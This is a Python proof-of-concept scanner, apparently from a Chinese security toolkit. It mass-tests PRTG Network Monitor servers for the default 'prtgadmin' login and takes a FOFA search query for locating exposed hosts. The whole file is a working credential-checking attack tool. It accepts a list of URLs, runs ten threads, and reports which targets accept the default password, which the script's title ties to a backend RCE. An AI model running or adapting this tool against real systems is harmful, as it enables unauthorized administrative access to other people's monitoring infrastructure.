#FOFA: title="prtg network monitor"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'PRTG NetWork Monitot default password (后台rce)',
        'vulnerable': False,
        'url': target
    }
    username = 'prtgadmin'
    password = 'prtgadmin'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(target, '/public/checklogin.htm')
    data = f'loginurl=&username={username}&password={password}'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, allow_redirects=False, verify=False)
        if rep.status_code == 302 and 'OCTOPUS' in rep.headers['Set-Cookie'] and 'PRTG' in rep.headers['Server']:
            result['vulnerable'] = True
            result['username'] = username
            result['password'] = password
            print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("prtg network monitor弱密码漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()